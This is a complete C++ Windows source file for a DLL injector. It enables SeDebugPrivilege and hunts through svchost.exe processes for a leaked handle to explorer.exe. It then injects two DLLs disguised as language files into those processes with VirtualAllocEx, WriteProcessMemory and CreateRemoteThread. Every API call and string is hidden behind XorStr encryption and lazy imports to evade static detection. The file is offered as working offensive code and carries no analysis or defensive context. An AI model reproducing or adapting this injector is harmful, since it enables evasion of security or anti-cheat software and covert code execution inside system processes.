#include "stdafx.h"
#include "D:\work\SDK\ntdll.h"
#include "D:\work\SDK\XorStr.hpp"
#include "D:\work\SDK\lazy_importer.hpp"
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#pragma comment(lib, "ntdll.lib")

VOID __forceinline error(LPCSTR szMsg)
{
	LI_FN(MessageBoxA)(nullptr, szMsg, XorStr("ERROR"), MB_OK);
	LI_FN(ExitProcess)(ERROR);
}

typedef BOOL(WINAPI *fnOpenProcessToken)(HANDLE, DWORD, PHANDLE);

BOOL __forceinline EnableDebugPrivilege(VOID) {

	HANDLE hToken;
	TOKEN_PRIVILEGES PrivilegeToken = { 1,{ 0, 0, SE_PRIVILEGE_ENABLED } };

	fnOpenProcessToken oOpenProcessToken = reinterpret_cast<fnOpenProcessToken>(LI_FN(GetProcAddress)(LI_FN(LoadLibraryA)(XorStr("ADVAPI32.dll")), XorStr("OpenProcessToken")));

	if (!LI_FN(LookupPrivilegeValueA)(nullptr, XorStr("SeDebugPrivilege"), &PrivilegeToken.Privileges[0].Luid))
		return FALSE;

	if (!oOpenProcessToken(NtCurrentProcess, TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	BOOL bStatus = LI_FN(AdjustTokenPrivileges)(hToken, FALSE, &PrivilegeToken, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr);

	LI_FN(CloseHandle)(hToken);
	return bStatus;
}

std::vector<DWORD> __forceinline EnumExploitableProcesses(LPCSTR szName) {

	std::vector<DWORD> PIDS;
	PROCESSENTRY32 ProcEntry;
	ProcEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = LI_FN(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL);

	if (hSnapshot == INVALID_HANDLE_VALUE)
		return PIDS;

	if (LI_FN(Process32First)(hSnapshot, &ProcEntry)) {
		do {
			if (!strcmp(ProcEntry.szExeFile, szName))
				PIDS.push_back(ProcEntry.th32ProcessID);

		} while (LI_FN(Process32Next)(hSnapshot, &ProcEntry));
	}
	LI_FN(CloseHandle)(hSnapshot);

	return PIDS;
}

DWORD __forceinline GetPidFromName(LPCSTR szName) {

	PROCESSENTRY32 ProcEntry = { NULL };
	ProcEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = LI_FN(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL);

	if (hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;

	if (LI_FN(Process32First)(hSnapshot, &ProcEntry)) {
		do {
			if (!strcmp(ProcEntry.szExeFile, szName)) {

				LI_FN(CloseHandle)(hSnapshot);
				return ProcEntry.th32ProcessID;
			}
		} while (LI_FN(Process32Next)(hSnapshot, &ProcEntry));
	}
	LI_FN(CloseHandle)(hSnapshot);

	return NULL;
}

PSYSTEM_HANDLE_INFORMATION __forceinline EnumSystemHandles(VOID) {

	DWORD dwSystemHandleInfoSize = 0x10000;
	PSYSTEM_HANDLE_INFORMATION pSystemHandleInfo = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(malloc(dwSystemHandleInfoSize));

	while (LI_FN(NtQuerySystemInformation)(SystemHandleInformation, pSystemHandleInfo, dwSystemHandleInfoSize, nullptr) == STATUS_INFO_LENGTH_MISMATCH)
		pSystemHandleInfo = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(realloc(pSystemHandleInfo, dwSystemHandleInfoSize *= 2));

	return pSystemHandleInfo;
}

HANDLE __forceinline FindProcessHandle(PSYSTEM_HANDLE_INFORMATION pSystemHandles, DWORD dwPid, DWORD dwTargetPid) {

	HANDLE hProcess, hObject;

	if (!(hProcess = LI_FN(OpenProcess)(PROCESS_DUP_HANDLE, FALSE, dwPid)))
		return NULL;

	for (DWORD i = NULL; i < pSystemHandles->NumberOfHandles; i++) {

		if (pSystemHandles->Handles[i].UniqueProcessId != dwPid || pSystemHandles->Handles[i].GrantedAccess != 0x1478)
			continue;

		HANDLE hHijack = reinterpret_cast<HANDLE>(pSystemHandles->Handles[i].HandleValue);

		if (!NT_SUCCESS(LI_FN(NtDuplicateObject)(hProcess, hHijack, NtCurrentProcess, &hObject, PROCESS_QUERY_LIMITED_INFORMATION, NULL, DUPLICATE_SAME_ATTRIBUTES)))
			continue;

		PROCESS_BASIC_INFORMATION ProcessInfo;
		ZeroMemory(&ProcessInfo, sizeof(PROCESS_BASIC_INFORMATION));

		if (NT_SUCCESS(LI_FN(NtQueryInformationProcess)(hObject, ProcessBasicInformation, &ProcessInfo, sizeof(PROCESS_BASIC_INFORMATION), nullptr)) &&
			dwTargetPid == (DWORD)ProcessInfo.UniqueProcessId) {

			LI_FN(CloseHandle)(hObject);
			LI_FN(CloseHandle)(hProcess);
			return hHijack;
		}
		LI_FN(CloseHandle)(hObject);
	}

	LI_FN(CloseHandle)(hProcess);
	return NULL;
}

BOOL __forceinline LoadRemoteLibrary(LPCSTR szDll, DWORD dwPid) {

	BOOL bStatus = FALSE;
	HANDLE hProcess, hThread;
	LPTHREAD_START_ROUTINE pLoadLibraryA;
	CHAR FullDllPath[MAX_PATH];
	LPVOID pThreadParam;

	if (!(pLoadLibraryA = reinterpret_cast<LPTHREAD_START_ROUTINE>(LI_FN(GetProcAddress)(LI_FN(GetModuleHandleA)(XorStr("Kernel32.dll")), XorStr("LoadLibraryA")))))
		return FALSE;
	
	if (LI_FN(GetFullPathNameA)(szDll, MAX_PATH, FullDllPath, nullptr) && (hProcess = LI_FN(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, dwPid))) {
		
		if (pThreadParam = LI_FN(VirtualAllocEx)(hProcess, nullptr, USN_PAGE_SIZE, MEM_COMMIT, PAGE_READWRITE)) {

			if (LI_FN(WriteProcessMemory)(hProcess, pThreadParam, FullDllPath, MAX_PATH, nullptr) &&
				(hThread = LI_FN(CreateRemoteThread)(hProcess, nullptr, NULL, pLoadLibraryA, pThreadParam, CREATE_SUSPENDED, nullptr))) {
				
				LI_FN(ResumeThread)(hThread);
				LI_FN(WaitForSingleObject)(hThread, INFINITE);
				LI_FN(CloseHandle)(hThread);
				
				bStatus = TRUE;
			}
			LI_FN(VirtualFreeEx)(hProcess, pThreadParam, NULL, MEM_RELEASE);
		}
		LI_FN(CloseHandle)(hProcess);
	}

	return bStatus;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	DWORD dwTargetPid, dwExploitablePid = NULL;
	HANDLE hHijack = NULL;

	LI_FN(LoadLibraryA)(XorStr("USER32.dll"));

	if (!EnableDebugPrivilege())
		error(XorStr("Cannot enable debug privilege!"));

	if (!(dwTargetPid = GetPidFromName(XorStr("explorer.exe"))))
		error(XorStr("Cannot find target process!"));

	std::vector<DWORD> PIDS = EnumExploitableProcesses(XorStr("svchost.exe"));

	if (PIDS.size() == NULL)
		error(XorStr("Cannot obtain process list!"));

	PSYSTEM_HANDLE_INFORMATION pSystemHandleInfo = EnumSystemHandles();

	if (pSystemHandleInfo->NumberOfHandles == NULL)
		error(XorStr("Cannot obtain system handles!"));

	for (DWORD i = NULL; i < PIDS.size(); i++) {

		if (hHijack = FindProcessHandle(pSystemHandleInfo, PIDS[i], dwTargetPid)) {

			dwExploitablePid = PIDS[i];
			break;
		}
	}

	if (!dwExploitablePid || !hHijack)
		error(XorStr("Cannot find exploitable handle!"));
	
	if (!LoadRemoteLibrary(XorStr("Lang\\lang-1029.dll"), dwTargetPid))
		error(XorStr("Cannot inject first dll into process!"));
	
	LI_FN(Sleep)(10);

	if (!LoadRemoteLibrary(XorStr("Lang\\lang-1037.dll"), dwExploitablePid))
		error(XorStr("Cannot inject second dll into process!"));
}
